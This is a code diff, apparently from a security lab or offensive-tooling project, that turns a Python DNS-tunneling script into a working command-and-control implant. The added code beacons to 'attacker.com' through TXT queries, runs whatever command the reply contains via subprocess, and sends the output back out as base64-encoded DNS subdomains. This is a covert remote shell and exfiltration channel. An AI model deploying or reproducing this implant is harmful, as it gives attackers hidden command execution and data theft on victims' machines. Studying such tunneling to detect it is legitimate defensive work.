@@ -3,10 +3,15 @@ import base64
 import dnslib
 import socket
 import time
+from enum import Enum
+import subprocess
+
+class TunnelMessageType(Enum): 
+    PROBE = 1
+    ACK = 2
 
 def print_status(s: str): 
     print(f"[*] {s}")
-
 
 class Tunneler: 
     def __init__(self, attacker_domain: str, resolver_ip_addr: str): 
@@ -15,27 +20,27 @@ class Tunneler:
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
     def tunnel(self, text: str) -> str | None: 
-        # chunked_string = self._chunk_string(text)
+        chunked_string = self._chunk_string(text)
 
-        # for payload in chunked_string: 
-        encoded = base64.urlsafe_b64encode(text.encode()).decode().strip("=")
+        for payload in chunked_string: 
+            encoded = base64.urlsafe_b64encode(payload.encode()).decode().strip("=")
 
-        domain = f"{encoded}.{self.attacker_domain}"
+            domain = f"{encoded}.{self.attacker_domain}"
 
-        print_status(f"Resolving query {domain}")
+            print_status(f"Resolving query {domain}")
 
-        q = dnslib.DNSRecord.question(domain, qtype="TXT")
+            q = dnslib.DNSRecord.question(domain, qtype="TXT")
 
-        self.socket.sendto(q.pack(), (self.resolver_ip_addr, 53))
+            self.socket.sendto(q.pack(), (self.resolver_ip_addr, 53))
 
-        response, _ = self.socket.recvfrom(4096)
+            response, _ = self.socket.recvfrom(4096)
 
-        reply = dnslib.DNSRecord.parse(response)
+            reply = dnslib.DNSRecord.parse(response)
 
-        for rr in reply.rr: 
-            if rr.rtype == dnslib.QTYPE.TXT: 
-                return base64.urlsafe_b64decode(str(rr.rdata)).decode()
-        return None
+            for rr in reply.rr: 
+                if rr.rtype == dnslib.QTYPE.TXT: 
+                    return base64.urlsafe_b64decode(str(rr.rdata)).decode()
+            return None
         
 
     def _chunk_string(self, s: str): 
@@ -44,17 +49,26 @@ class Tunneler:
 
 def main(): 
     tunneler = Tunneler("attacker.com", "10.0.2.51")
-    to_tunnel = "DNS Tunneling Established"
     while True: 
-        response = tunneler.tunnel(to_tunnel)
+        time.sleep(3)
+
+        response = tunneler.tunnel(TunnelMessageType.PROBE.name)
         if not response: 
             continue
         print_status(response)
-        if response == "ACK": 
+
+        if response == TunnelMessageType.ACK.name: 
             continue
-        # execute response and set to tunnel to the output
-        
-        time.sleep(5)
+        else: 
+            result = subprocess.run(
+                response.strip().split(" "),
+                capture_output=True,
+                text=True
+            )
+            if result.stdout: 
+                tunneler.tunnel(result.stdout)
+            if result.stderr: 
+                tunneler.tunnel(result.stderr)
 
 
 if __name__ == "__main__": 
